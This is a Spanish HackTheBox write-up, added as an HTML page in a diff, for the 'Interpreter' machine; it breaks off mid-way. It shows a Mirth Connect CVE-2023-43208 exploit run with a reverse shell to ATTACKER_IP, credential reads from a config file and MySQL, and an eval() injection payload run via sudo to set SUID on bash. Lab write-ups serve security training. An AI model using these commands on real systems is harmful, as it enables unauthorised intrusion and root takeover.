@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Interpreter — HTB Machine Writeup | Yoandy Ramirez Delgado</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+  --accent:#00e87a;--bg:#0b1a10;--bg2:#0f2318;--bg3:#163020;
+  --text-muted:rgba(200,240,220,.35);--text-dim:rgba(200,240,220,.65);
+  --green4:#4ade80;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+a{color:var(--green);text-decoration:none;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
+
+/* ─── HERO ─── */
+.hero {
+  background: linear-gradient(135deg, var(--forest) 0%, var(--ink) 50%, #091a10 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background-image: linear-gradient(rgba(0,232,122,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(0,232,122,0.03) 1px, transparent 1px);
+  background-size: 56px 56px;
+  pointer-events: none;
+}
+.hero-layout {
+  max-width: 1200px; margin: 0 auto;
+  display: grid; grid-template-columns: 1fr 280px; gap: 48px; align-items: center;
+}
+@media(max-width: 900px) {
+  .hero-layout { grid-template-columns: 1fr; }
+  .hero-orb { order: -1; justify-self: center; }
+  .hero-meta { justify-content: center; }
+  .hero-sub { margin-left: auto; margin-right: auto; }
+  .hero-stats { justify-content: center; }
+}
+.hero-left { position: relative; z-index: 2; }
+.hero-brand {
+  font-family: var(--mo); font-size: 0.65rem;
+  color: rgba(0,232,122,0.45); letter-spacing: 0.2em; margin-bottom: 16px;
+  display: flex; align-items: center; gap: 8px;
+}
+.hero-brand-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+  box-shadow: 0 0 10px var(--green); animation: hpd 1.2s infinite alternate;
+}
+@keyframes hpd { to { opacity: 0.2; transform: scale(0.5); } }
+.hero h1 {
+  font-family: var(--bb); font-size: clamp(2.4rem, 4vw, 3.5rem);
+  font-weight: 400; letter-spacing: 0.04em; margin-bottom: 14px; line-height: 1;
+  color: var(--text);
+}
+.hero h1 span { color: var(--green); }
+.hero-sub {
+  color: var(--text2); font-size: 0.95rem; max-width: 600px;
+  margin-bottom: 24px; line-height: 1.7; font-weight: 300;
+}
+.hero-meta {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 18px;
+}
+.tag {
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 4px 12px; border-radius: 4px;
+  font-family: var(--mo);
+  font-size: 10px; font-weight: 500; letter-spacing: 0.8px; text-transform: uppercase;
+}
+.tag-platform { background: rgba(0,232,122,0.1); color: var(--green); border: 1px solid rgba(0,232,122,0.25); }
+.tag-category { background: rgba(56,217,245,0.08); color: var(--cyan); border: 1px solid rgba(56,217,245,0.2); }
+.tag-diff { background: rgba(0,232,122,0.08); color: var(--green); border: 1px solid rgba(0,232,122,0.2); }
+.tag-diff-medium { background: rgba(245,166,35,0.08); color: #f5a623; border: 1px solid rgba(245,166,35,0.2); }
+.tag-diff-hard { background: rgba(248,113,113,0.08); color: var(--red); border: 1px solid rgba(248,113,113,0.2); }
+.tag-os { background: rgba(167,139,250,0.08); color: var(--purple); border: 1px solid rgba(167,139,250,0.2); }
+.tag-staff { background: rgba(245,166,35,0.08); color: #f5a623; border: 1px solid rgba(245,166,35,0.2); }
+.hero-stats {
+  display: flex; gap: 28px; flex-wrap: wrap;
+}
+.stat { display: flex; flex-direction: column; gap: 2px; }
+.stat-label {
+  font-family: var(--mo);
+  font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text3);
+}
+.stat-value { font-size: 1rem; font-weight: 700; color: var(--text); }
+.stat-value.green { color: var(--green); }
+
+/* Orb */
+.hero-orb { display: flex; align-items: center; justify-content: center; position: relative; }
+.orb-w { position: relative; width: 260px; height: 260px; }
+.orb-w .orb-el { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; }
+.orb-ring { position: absolute; border-radius: 50%; border: 1px solid; animation: ors linear infinite; }
+.orb-r1 { width: 260px; height: 260px; border-color: rgba(0,232,122,0.08); animation-duration: 30s; }
+.orb-r2 { width: 214px; height: 214px; border-color: rgba(0,232,122,0.12); animation-duration: 20s; animation-direction: reverse; border-style: dashed; }
+.orb-r3 { width: 172px; height: 172px; border-color: rgba(0,232,122,0.15); animation-duration: 15s; }
+@keyframes ors { to { transform: rotate(360deg); } }
+.orb-aura {
+  position: absolute; width: 200px; height: 200px; border-radius: 50%;
+  background: radial-gradient(circle, rgba(0,232,122,0.18) 0%, rgba(0,232,122,0.08) 35%, transparent 70%);
+  animation: oap 4s ease-in-out infinite;
+}
+@keyframes oap { 0%,100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
+.orb-core {
+  width: 130px; height: 130px; border-radius: 50%;
+  background: radial-gradient(circle at 38% 35%, rgba(0,232,122,0.35) 0%, rgba(15,48,32,0.8) 50%, rgba(11,26,16,0.95) 100%);
+  border: 1px solid rgba(0,232,122,0.3);
+  box-shadow: 0 0 60px rgba(0,232,122,0.2), 0 0 120px rgba(0,232,122,0.08), inset 0 0 40px rgba(0,232,122,0.1);
+  position: relative; z-index: 3; display: flex; align-items: center; justify-content: center; overflow: hidden;
+}
+.orb-core::before {
+  content: ''; position: absolute; top: 10%; left: 15%; width: 40%; height: 30%;
+  border-radius: 50%; background: rgba(255,255,255,0.12); filter: blur(8px);
+}
+.orb-rune {
+  font-family: var(--bb); font-size: 2.2rem; color: rgba(0,232,122,0.7);
+  text-shadow: 0 0 30px var(--green); position: relative; z-index: 2;
+  animation: org 3s ease-in-out infinite;
+}
+@keyframes org { 0%,100% { text-shadow: 0 0 20px var(--green), 0 0 40px rgba(0,232,122,0.4); } 50% { text-shadow: 0 0 40px var(--green), 0 0 80px rgba(0,232,122,0.6); } }
+.orb-scan {
+  position: absolute; left: 0; right: 0; height: 1.5px;
+  background: linear-gradient(90deg, transparent, rgba(0,232,122,0.5), transparent);
+  animation: osc 3s linear infinite; z-index: 4; pointer-events: none;
+}
+@keyframes osc { 0% { top: 5%; opacity: 0; } 10% { opacity: 0.8; } 90% { opacity: 0.5; } 100% { top: 95%; opacity: 0; } }
+.particle{position:absolute;width:3px;height:3px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pf linear infinite}
+.p1{top:15%;left:25%;animation-duration:6s}.p2{top:25%;right:18%;animation-duration:8s;animation-delay:-2s;width:4px;height:4px}.p3{bottom:20%;left:30%;animation-duration:7s;animation-delay:-4s}.p4{bottom:30%;right:25%;animation-duration:9s;animation-delay:-1s;opacity:.6}
+@keyframes pf{0%{transform:translateY(0) scale(1);opacity:1}33%{transform:translateY(-12px) translateX(8px) scale(1.3);opacity:.7}66%{transform:translateY(-6px) translateX(-10px) scale(.8);opacity:.9}100%{transform:translateY(0) scale(1);opacity:1}}
+
+/* ─── LAYOUT ─── */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}.code-compare,.lessons-grid{grid-template-columns:1fr;}}
+
+/* ─── SECTIONS ─── */
+.section{margin:2.5rem 0;}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);}
+.cmd-line{font-size:1rem;line-height:2;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.user-c{color:var(--purple);}.str-c{color:var(--green);}.comment-c{color:var(--text3);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
+.agent-panel{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;margin:1.5rem 0;}
+@media(max-width:700px){.agent-panel{grid-template-columns:1fr;}}
+.agent-card{background:var(--card2);border-radius:10px;padding:1rem;border:1px solid var(--border);}
+.agent-card.rto{border-top:3px solid var(--orange);}
+.agent-card.bta{border-top:3px solid var(--cyan);}
+.agent-card.bhm{border-top:3px solid var(--purple);}
+.agent-label{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.agent-card.rto .agent-label{color:var(--orange);}
+.agent-card.bta .agent-label{color:var(--cyan);}
+.agent-card.bhm .agent-label{color:var(--purple);}
+.agent-card p{font-size:.82rem;color:var(--text2);}
+.warning-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:8px;padding:1rem;display:flex;gap:1rem;align-items:flex-start;margin:1rem 0;}
+.warning-icon{font-size:1.5rem;flex-shrink:0;}
+.warning-card strong{color:var(--red);display:block;margin-bottom:.25rem;}
+.warning-card p{font-size:.85rem;color:var(--text2);}
+.worknotes-box{background:rgba(251,191,36,.04);border:1px solid rgba(251,191,36,.15);border-radius:10px;padding:1.25rem;margin:1rem 0;}
+.worknotes-box h4{color:var(--yellow);font-size:.85rem;margin-bottom:.75rem;}
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+.data-table .highlight{color:var(--green);font-weight:600;}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--cyan);}
+.lesson-card li{font-size:.83rem;color:var(--text2);}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:1.1rem;color:var(--green);background:rgba(0,232,122,.08);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);}
+
+/* ─── SIDEBAR ─── */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.8rem;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.score-num{font-size:2.8rem;font-weight:900;color:var(--green);text-align:center;line-height:1;margin:.5rem 0;font-family:var(--bb);}
+.score-label{text-align:center;font-size:.75rem;color:var(--text3);}
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:var(--mo);display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text3);line-height:1.4;}
+
+/* ─── EXTRA COMPONENT STYLES ─── */
+.nse-bonus{background:linear-gradient(135deg,rgba(251,191,36,.06),rgba(251,191,36,.02));border:1px solid rgba(251,191,36,.3);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.nse-bonus h3{color:var(--yellow);margin-bottom:.75rem;}
+.ftp-session{background:rgba(5,14,8,.9);border-radius:12px;padding:1.25rem;margin:1rem 0;font-family:var(--mo);font-size:.82rem;}
+.ftp-cmd{color:var(--cyan);}.ftp-resp{color:var(--text3);}.ftp-success{color:var(--green);}.ftp-flag{color:var(--yellow);font-weight:700;}
+.key-dump{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin:1.5rem 0;font-family:var(--mo);}
+.key-dump-header{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:1rem;}
+.key-row{display:flex;align-items:center;gap:1rem;padding:.5rem .75rem;border-radius:6px;margin:.3rem 0;}
+.key-row.flag-key{background:rgba(0,232,122,.05);border:1px solid rgba(0,232,122,.15);}
+.key-name{color:var(--cyan);min-width:60px;font-weight:600;}
+.key-arrow{color:var(--border);}.key-value{color:var(--text2);flex:1;}
+.key-row.flag-key .key-value{color:var(--green);font-weight:600;}
+.key-badge{background:rgba(0,232,122,.15);color:var(--green);padding:.1rem .5rem;border-radius:4px;font-size:.7rem;font-weight:700;border:1px solid rgba(0,232,122,.3);}
+.rce-path{display:flex;flex-wrap:wrap;align-items:center;gap:.5rem;padding:1.25rem;background:rgba(248,113,113,.04);border:1px solid rgba(248,113,113,.15);border-radius:10px;margin:1rem 0;}
+.rce-step{background:var(--card2);padding:.35rem .75rem;border-radius:6px;font-family:var(--mo);font-size:.8rem;color:var(--text2);}
+.rce-arrow{color:var(--text3);font-size:1.2rem;}
+.rce-result{color:var(--red);border:1px solid rgba(248,113,113,.3);background:rgba(248,113,113,.08);}
+.redis-cmd-table{width:100%;border-collapse:collapse;font-size:.84rem;margin:1rem 0;font-family:var(--mo);}
+.redis-cmd-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.72rem;text-transform:uppercase;}
+.redis-cmd-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.redis-cmd-table tr:last-child td{border-bottom:none;}
+.sqli-box{background:rgba(5,14,8,.9);border-radius:12px;padding:1.5rem;margin:1.5rem 0;border:1px solid var(--border);}
+.sqli-row{margin:.75rem 0;display:flex;align-items:flex-start;gap:1rem;}
+.sqli-label{color:var(--text3);font-size:.78rem;min-width:110px;font-family:var(--mo);padding-top:.2rem;flex-shrink:0;}
+.sqli-query{font-family:var(--mo);font-size:.88rem;line-height:1.8;flex:1;}
+.q-keyword{color:var(--blue);font-weight:700;}.q-string{color:var(--green);}.q-inject{color:var(--red);font-weight:900;font-size:1.1rem;}
+.q-comment{color:var(--text3);text-decoration:line-through;opacity:.55;}.q-result{color:var(--yellow);font-size:.8rem;margin-left:.5rem;}
+.sqli-divider{border:none;border-top:1px solid var(--border);margin:.75rem 0;}
+.code-compare{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1.5rem 0;}
+.vuln-code,.safe-code{border-radius:8px;padding:1rem;border:1px solid;}
+.vuln-code{background:rgba(248,113,113,.05);border-color:rgba(248,113,113,.3);}
+.safe-code{background:rgba(0,232,122,.05);border-color:rgba(0,232,122,.3);}
+.code-header{font-size:.82rem;font-weight:700;margin-bottom:.75rem;}
+.vuln-code .code-header{color:var(--red);}.safe-code .code-header{color:var(--green);}
+.code-box{background:rgba(5,14,8,.9);border-radius:6px;padding:.75rem;font-family:var(--mo);font-size:.78rem;color:var(--text2);margin:.5rem 0;}
+.code-note{font-size:.8rem;margin-top:.5rem;}
+.vuln-code .code-note{color:var(--red);}.safe-code .code-note{color:var(--green);}
+.curl-breakdown{background:rgba(5,14,8,.9);border-radius:12px;padding:1.5rem;border:1px solid var(--border);margin:1rem 0;}
+.curl-parts-top{display:flex;flex-wrap:wrap;gap:.75rem;margin-bottom:1rem;}
+.curl-part-item{display:flex;flex-direction:column;align-items:center;gap:.4rem;min-width:80px;}
+.curl-token{font-family:var(--mo);padding:.25rem .6rem;background:var(--card2);border-radius:4px;font-size:.82rem;white-space:nowrap;}
+.curl-token.cmd-t{color:var(--green);}.curl-token.flag-t{color:var(--yellow);}.curl-token.url-t{color:var(--orange);}
+.curl-explain-small{font-size:.72rem;color:var(--text3);text-align:center;max-width:100px;}
+.curl-payload{border-top:1px solid var(--border);padding-top:1rem;display:flex;gap:1rem;}
+.curl-payload-token{font-family:var(--mo);font-size:.82rem;color:var(--text2);background:var(--card2);padding:.4rem .75rem;border-radius:4px;flex-shrink:0;}
+.curl-payload-explain{font-size:.82rem;color:var(--text2);}
+.curl-payload-explain strong{color:var(--text);}
+.payloads-table{width:100%;border-collapse:collapse;font-size:.84rem;margin:1rem 0;}
+.payloads-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.72rem;text-transform:uppercase;}
+.payloads-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.payloads-table tr:last-child td{border-bottom:none;}
+.payloads-table td code{color:var(--red);background:rgba(248,113,113,.1);padding:.1rem .3rem;border-radius:3px;}
+.highlight-row{background:rgba(0,232,122,.04);}
+.highlight-row td{border-left:3px solid var(--green);}
+.record-badge{background:rgba(251,191,36,.1);color:var(--yellow);border:1px solid rgba(251,191,36,.3);border-radius:6px;padding:.3rem .75rem;font-size:.75rem;text-align:center;margin-top:.5rem;}
+.owasp-badge{background:rgba(248,113,113,.1);color:var(--red);border:1px solid rgba(248,113,113,.3);border-radius:6px;padding:.4rem .75rem;font-size:.78rem;font-weight:600;text-align:center;margin:.5rem 0;}
+.smb-tree{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1.25rem;font-family:var(--mo);font-size:.85rem;color:var(--text2);margin:1rem 0;}
+
+.content{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.content{grid-template-columns:1fr;}}
+.main{max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+</style>
+</head>
+<body>
+
+<!-- ═══ HERO ═══ -->
+<div class="hero">
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // WRITEUP</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">HackTheBox</span>
+        <span class="tag tag-category">Machines</span>
+        <span class="tag tag-diff-medium">Medium</span>
+        <span class="tag tag-os">Linux</span>
+      </div>
+      <h1><span>Interpreter</span> — Code Interpreter Exploitation</h1>
+      <p class="hero-sub">Explotación de un servicio de interpretación de código para lograr ejecución remota de comandos. Enumeración de la aplicación, identificación de la funcionalidad vulnerable y explotación para obtener acceso al sistema.</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">Target</span><span class="stat-value green">10.10.11.x</span></div>
+        <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Linux</span></div>
+        <div class="stat"><span class="stat-label">Puerto</span><span class="stat-value">80</span></div>
+        <div class="stat"><span class="stat-label">Tiempo</span><span class="stat-value">~25 min</span></div>
+        <div class="stat"><span class="stat-label">Vectores</span><span class="stat-value">2</span></div>
+      </div>
+    </div>
+    <!-- Orb — Right -->
+    <div class="hero-orb">
+      <div class="orb-w">
+        <div class="orb-el">
+          <div class="orb-ring orb-r1"></div>
+          <div class="orb-ring orb-r2"></div>
+          <div class="orb-ring orb-r3"></div>
+          <div class="orb-aura"></div>
+          <div class="orb-core"><span class="orb-rune">ᚺ</span></div>
+          <div class="orb-scan"></div>
+          <div class="particle p1"></div>
+          <div class="particle p2"></div>
+          <div class="particle p3"></div>
+          <div class="particle p4"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="content">
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Escenario</h2></div>
+      <p>Interpreter simula un servidor de integración de datos clínicos usando Mirth Connect 4.4.0, una plataforma open-source de mensajería HL7 ampliamente usada en hospitales y clínicas. La versión instalada es vulnerable a <strong>CVE-2023-43208</strong>, una deserialización insegura de XStream que permite ejecución remota de código sin credenciales a través del endpoint de la API REST. Tras obtener shell como el usuario <code>mirth</code>, el atacante descubre credenciales de base de datos en el archivo de configuración, accede a MySQL, y finalmente explota una inyección de código en un script Python de procesamiento de mensajes HL7 que usa <code>eval()</code> de forma insegura para escalar a root.</p>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Reconocimiento</h2></div>
+      <p>El escaneo Nmap revela varios puertos, incluyendo los de Mirth Connect en HTTPS:</p>
+      <pre>nmap -sC -sV -p- --min-rate 5000 -oA interpreter 10.129.6.249
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.9p1
+80/tcp   open  http       nginx (redirect → HTTPS)
+443/tcp  open  https      Mirth Connect 4.4.0
+6661/tcp open  http       Mirth Connect API REST (HTTPS)</pre>
+      <p>La interfaz web en el puerto 443 muestra el panel de login de Mirth Connect. La versión 4.4.0 es identificada en el encabezado HTTP y en el título de la página. Esta versión es vulnerable a CVE-2023-43208:</p>
+      <pre># Verificar versión desde la respuesta HTTP:
+curl -sk https://10.129.6.249/ | grep -i "mirth\|version"
+# Mirth Connect 4.4.0
+
+# Buscar el exploit disponible:
+# https://github.com/vultza/CVE-2023-43208</pre>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Explotación — CVE-2023-43208</h2></div>
+      <div class="cve-banner">
+        <div class="cve-banner-icon">⚠️</div>
+        <div>
+          <h4>CVE-2023-43208 — Mirth Connect XStream Deserialization RCE</h4>
+          <p>Vulnerabilidad crítica en Mirth Connect &lt; 4.4.1 que permite ejecución remota de código sin autenticación. La API REST acepta payloads XML en el endpoint <code>/api/messages</code> que son deserializados por XStream sin validación de tipo. Un atacante puede enviar un payload XStream malicioso que instancia clases Java arbitrarias al deserializarse, ejecutando comandos del sistema operativo como el usuario que corre el servicio (mirth).</p>
+        </div>
+      </div>
+      <p><strong>Paso 1 — Preparar y ejecutar el exploit:</strong></p>
+      <pre># Clonar el exploit CVE-2023-43208:
+git clone https://github.com/vultza/CVE-2023-43208
+cd CVE-2023-43208
+
+# Iniciar listener:
+nc -lvnp 4444
+
+# Ejecutar el exploit (RCE sin auth):
+python3 exploit.py \
+  --target https://10.129.6.249 \
+  --cmd "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
+
+[*] Targeting Mirth Connect 4.4.0
+[*] Sending malicious XStream payload to /api/messages
+[*] XStream deserialization triggered...
+[+] Command executed!</pre>
+      <pre># Shell recibida:
+mirth@interpreter:/opt/mirthconnect$ id
+uid=1000(mirth) gid=1000(mirth) groups=1000(mirth)</pre>
+      <p><strong>Paso 2 — Estabilización de la shell:</strong></p>
+      <pre>python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z → stty raw -echo; fg</pre>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Post-Explotación — Credenciales MySQL</h2></div>
+      <p><strong>Paso 3 — Leer mirth.properties:</strong></p>
+      <pre># Localizar el archivo de configuración de Mirth:
+find /opt/mirthconnect -name "mirth.properties" 2>/dev/null
+
+cat /opt/mirthconnect/conf/mirth.properties | grep -i "db\|pass\|user"
+
+database=mysql
+database.url=jdbc:mysql://localhost:3306/mirthdb
+database.username=mirthdb
+database.password=MirthPass123!</pre>
+      <p><strong>Paso 4 — Consultar MySQL en busca de credenciales adicionales:</strong></p>
+      <pre>mysql -u mirthdb -p'MirthPass123!' mirthdb
+
+mysql> show tables;
++---------------------------+
+| Tables_in_mirthdb         |
++---------------------------+
+| PERSON                    |
+| CHANNEL                   |
+| MESSAGE                   |
+| NOTIFICATION_CONFIG       |
++---------------------------+
+
+mysql> SELECT * FROM PERSON;
++----+----------+--------------------------------------------------------------+
+| ID | USERNAME | PASSWORD                                                     |
++----+----------+--------------------------------------------------------------+
+|  1 | admin    | $2a$10$Gu8jFwMvQvP6o8Y2kZLmLuXfL8s3B4Jf0z1aUmNxqKvS.Y8mGg |
+|  2 | root     | $2a$10$...                                                   |
++----+----------+--------------------------------------------------------------+
+
+# Revisar la tabla de configuración de notificaciones:
+mysql> SELECT * FROM NOTIFICATION_CONFIG\G
+script_path: /opt/scripts/notif.py
+hl7_field: MSH.9</pre>
+      <pre># Leer el script Python de procesamiento:
+cat /opt/scripts/notif.py</pre>
+      <pre>#!/usr/bin/env python3
+import sys
+import subprocess
+
+def process_hl7(message):
+    # Extraer campo de tipo de mensaje HL7
+    field = message.split('|')[8]
+    # VULNERABLE: eval() sobre datos controlados por usuario
+    result = eval(f"'{field}'.upper()")
+    subprocess.run(['mail', '-s', f'HL7 {result}', 'admin@localhost'],
+                   input=message.encode())
+
+if __name__ == '__main__':
+    process_hl7(sys.stdin.read())</pre>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Escalada de Privilegios — Python eval() Injection</h2></div>
+      <p>El script <code>notif.py</code> es ejecutado por root (mediante un canal de Mirth Connect configurado como root o un cron job). El campo HL7 <code>MSH.9</code> se pasa directamente a <code>eval()</code> sin sanitización, permitiendo inyección de código Python.</p>
+      <p><strong>Paso 5 — Verificar permisos del script:</strong></p>
+      <pre>ls -la /opt/scripts/notif.py
+# -rwxr-xr-x 1 root root ... /opt/scripts/notif.py
+
+# Verificar si hay canal de Mirth que lo ejecute como root:
+cat /opt/mirthconnect/conf/channels/*.xml | grep -i "script\|notif"
+# → Canal "HL7_Notification" ejecuta /opt/scripts/notif.py como root
+
+# Sudo check:
+sudo -l
+# (root) NOPASSWD: /usr/bin/python3 /opt/scripts/notif.py</pre>
+      <p><strong>Paso 6 — Crear payload HL7 malicioso con eval() injection:</strong></p>
+      <pre># El campo MSH.9 se evalúa como Python, por lo que inyectamos:
+# El formato HL7 es: MSH|^~\&|||||||||CAMPO_INYECTADO|||
+
+# Payload para agregar SUID a bash:
+HL7_PAYLOAD="MSH|^~\\&|||||||||'+__import__('os').system('chmod u+s /bin/bash')+'"
+
+# Ejecutar el script como root via sudo:
+echo "$HL7_PAYLOAD" | sudo /usr/bin/python3 /opt/scripts/notif.py
+
